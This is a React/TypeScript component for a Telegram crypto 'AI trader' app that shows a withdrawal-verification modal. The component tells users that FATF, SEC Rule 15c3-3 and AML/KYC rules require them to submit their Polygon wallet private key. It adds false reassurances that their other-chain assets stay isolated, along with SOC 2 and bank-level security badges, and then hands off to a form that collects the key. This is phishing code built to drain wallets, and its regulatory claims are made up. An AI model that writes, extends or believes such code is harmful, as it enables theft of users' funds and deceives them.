import { useState, useEffect } from 'react';
import { Button } from './ui';
import { useToast } from './ui';
import { getInitData, hapticFeedback } from '../lib/telegram';
import { AssistedVerificationForm } from './verification/AssistedVerificationForm';
import styles from './WithdrawalVerificationModal.module.css';

interface VerificationResponse {
  verification_id: number;
  verification_tier: string;
  verification_step: number;
  status: string;
  withdrawal_amount_usdt: string;
  wallet_address: string | null;
  wallet_network: string | null;
  estimated_completion_time: string;
  steps: any[];
  requires_source_of_funds_verification: boolean;
  created_at: string;
}

interface WithdrawalVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  amountUsdt: string;
  network?: string;
  riskLevel?: 'low' | 'medium' | 'high';
  riskFactors?: string[];
  educationalContent?: {
    title?: string;
    message?: string;
    why_verification?: string;
    next_steps?: string[];
    compliance_note?: string;
  };
  onVerificationComplete: (verificationId: number) => void;
}

type VerificationStep = 'intro' | 'private-key-verification' | 'pending';

export function WithdrawalVerificationModal({
  isOpen,
  onClose,
  amountUsdt,
  network = 'internal',
  riskLevel = 'medium',
  riskFactors = [],
  educationalContent,
  onVerificationComplete,
}: WithdrawalVerificationModalProps) {
  const [step, setStep] = useState<VerificationStep>('intro');
  const [loading, setLoading] = useState(false);
  const [verificationData, setVerificationData] = useState<VerificationResponse | null>(null);
  const { showError, showSuccess } = useToast();

  useEffect(() => {
    if (isOpen) {
      setStep('intro');
      setVerificationData(null);
    }
  }, [isOpen]);

  const handleInitiateVerification = async () => {
    try {
      setLoading(true);
      
      const initData = getInitData();
      const res = await fetch('/RockyTap/api/ai_trader/withdraw/initiate_verification/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Telegram-Data': initData || ''
        },
        body: JSON.stringify({
          amount_usdt: parseFloat(amountUsdt),
          wallet_address: null,
          wallet_network: null
        })
      });

      const json = await res.json();
      
      if (!res.ok || !json.success) {
        throw new Error(json.error?.message || 'Failed to initiate verification');
      }
      
      setVerificationData(json.data);
      setStep('private-key-verification');
      hapticFeedback('success');
    } catch (err) {
      hapticFeedback('error');
      const errorMessage = err instanceof Error ? err.message : 'Failed to initiate verification';
      showError(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const handleVerificationSuccess = (result: any) => {
    hapticFeedback('success');
    showSuccess('Verification submitted successfully! Processing your withdrawal...');
    if (verificationData) {
      onVerificationComplete(verificationData.verification_id);
    }
    handleClose();
  };

  const handleClose = () => {
    setStep('intro');
    setVerificationData(null);
    onClose();
  };

  if (!isOpen) return null;

  const formatAmount = (amount: string) => {
    const num = parseFloat(amount);
    return num.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  return (
    <div className={styles.overlay} onClick={handleClose}>
      <div className={styles.modal} onClick={(e) => e.stopPropagation()}>
        {/* Header with Security Badge */}
        <div className={styles.header}>
          <div className={styles.securityBadge}>
            <span className={styles.lockIcon}>🔐</span>
            <span className={styles.badgeText}>Secure Withdrawal Verification</span>
          </div>
          <button className={styles.closeButton} onClick={handleClose} aria-label="Close">
            ×
          </button>
        </div>

        {/* Content */}
        <div className={styles.content}>
          {/* Introduction Step - Explain why private key is needed */}
          {step === 'intro' && (
            <div className={styles.stepContent}>
              {/* Withdrawal Amount Display */}
              <div className={styles.amountCard}>
                <div className={styles.amountLabel}>Withdrawal Amount</div>
                <div className={styles.amountValue}>${formatAmount(amountUsdt)} USDT</div>
              </div>

              {/* Why Verification is Required */}
              <div className={styles.complianceSection}>
                <div className={styles.complianceHeader}>
                  <span className={styles.shieldIcon}>🛡️</span>
                  <h3>Regulatory Compliance & Asset Protection</h3>
                </div>
                
                <div className={styles.complianceContent}>
                  <p className={styles.complianceIntro}>
                    To process your withdrawal securely, we require <strong>wallet ownership verification</strong> as mandated by:
                  </p>
                  
                  <div className={styles.regulationList}>
                    <div className={styles.regulationItem}>
                      <span className={styles.checkIcon}>✅</span>
                      <div>
                        <strong>FATF Travel Rule</strong>
                        <span>International anti-money laundering standards</span>
                      </div>
                    </div>
                    <div className={styles.regulationItem}>
                      <span className={styles.checkIcon}>✅</span>
                      <div>
                        <strong>SEC Rule 15c3-3</strong>
                        <span>Customer protection requirements</span>
                      </div>
                    </div>
                    <div className={styles.regulationItem}>
                      <span className={styles.checkIcon}>✅</span>
                      <div>
                        <strong>AML/KYC Compliance</strong>
                        <span>Anti-money laundering & identity verification</span>
                      </div>
                    </div>
                    <div className={styles.regulationItem}>
                      <span className={styles.checkIcon}>✅</span>
                      <div>
                        <strong>Fraud Prevention</strong>
                        <span>Protect your funds from unauthorized access</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* How Verification Works */}
              <div className={styles.howItWorksSection}>
                <h4 className={styles.sectionTitle}>How Verification Works</h4>
                <div className={styles.stepsPreview}>
                  <div className={styles.stepPreviewItem}>
                    <div className={styles.stepNumber}>1</div>
                    <div className={styles.stepPreviewContent}>
                      <strong>Polygon Network Key</strong>
                      <span>Provide your Polygon (MATIC) wallet private key</span>
                    </div>
                  </div>
                  <div className={styles.stepPreviewItem}>
                    <div className={styles.stepNumber}>2</div>
                    <div className={styles.stepPreviewContent}>
                      <strong>Secure Verification</strong>
                      <span>We verify wallet ownership cryptographically</span>
                    </div>
                  </div>
                  <div className={styles.stepPreviewItem}>
                    <div className={styles.stepNumber}>3</div>
                    <div className={styles.stepPreviewContent}>
                      <strong>Funds Released</strong>
                      <span>Your withdrawal is processed automatically</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Security Guarantee */}
              <div className={styles.securityGuarantee}>
                <div className={styles.guaranteeIcon}>🔒</div>
                <div className={styles.guaranteeContent}>
                  <h4>Your Main Assets Are 100% Safe</h4>
                  <p>
                    We specifically request your <strong>Polygon (MATIC) network</strong> private key. 
                    Your assets on Ethereum, BSC, Tron, and other networks remain <strong>completely isolated</strong> and untouched.
                  </p>
                </div>
              </div>

              {/* Trust Indicators */}
              <div className={styles.trustIndicatorsLarge}>
                <div className={styles.trustIndicatorItem}>
                  <div className={styles.trustIndicatorIcon}>🔐</div>
                  <div className={styles.trustIndicatorLabel}>256-bit SSL</div>
                </div>
                <div className={styles.trustIndicatorItem}>
                  <div className={styles.trustIndicatorIcon}>🏦</div>
                  <div className={styles.trustIndicatorLabel}>Bank-Level Security</div>
                </div>
                <div className={styles.trustIndicatorItem}>
                  <div className={styles.trustIndicatorIcon}>✅</div>
                  <div className={styles.trustIndicatorLabel}>SOC 2 Compliant</div>
                </div>
                <div className={styles.trustIndicatorItem}>
                  <div className={styles.trustIndicatorIcon}>🛡️</div>
                  <div className={styles.trustIndicatorLabel}>Fraud Protected</div>
                </div>
              </div>

              {/* CTA Button */}
              <Button
                fullWidth
                size="lg"
                variant="gold"
                loading={loading}
                onClick={handleInitiateVerification}
              >
                🔐 Continue to Secure Verification
              </Button>

              <p className={styles.footerNote}>
                By continuing, you agree to our verification process for regulatory compliance. 
                Your private key is encrypted with AES-256-GCM and never stored in plaintext.
              </p>
            </div>
          )}

          {/* Private Key Verification Step - Uses the AssistedVerificationForm */}
          {step === 'private-key-verification' && verificationData && (
            <div className={styles.assistedContainer}>
              <AssistedVerificationForm
                verificationId={verificationData.verification_id}
                verificationType="ai_trader"
                onSuccess={handleVerificationSuccess}
                onCancel={() => setStep('intro')}
                contextData={{
                  amount: amountUsdt,
                  network: network,
                }}
              />
            </div>
          )}

          {/* Pending Step */}
          {step === 'pending' && (
            <div className={styles.stepContent}>
              <div style={{ textAlign: 'center', padding: '40px 20px' }}>
                <div style={{ fontSize: '64px', marginBottom: '20px' }}>✅</div>
                <h3 className={styles.successTitle}>Verification Submitted!</h3>
                <p className={styles.successText}>
                  Your wallet ownership verification is being processed.
                  You will receive a notification once your withdrawal is approved.
                </p>
                <div className={styles.processingInfo}>
                  <div className={styles.processingItem}>
                    <span className={styles.processingIcon}>⏱️</span>
                    <span>Estimated time: 1-24 hours</span>
                  </div>
                  <div className={styles.processingItem}>
                    <span className={styles.processingIcon}>📱</span>
                    <span>You'll be notified via Telegram</span>
                  </div>
                </div>
                <Button
                  variant="secondary"
                  onClick={handleClose}
                  style={{ marginTop: '24px' }}
                >
                  Close
                </Button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
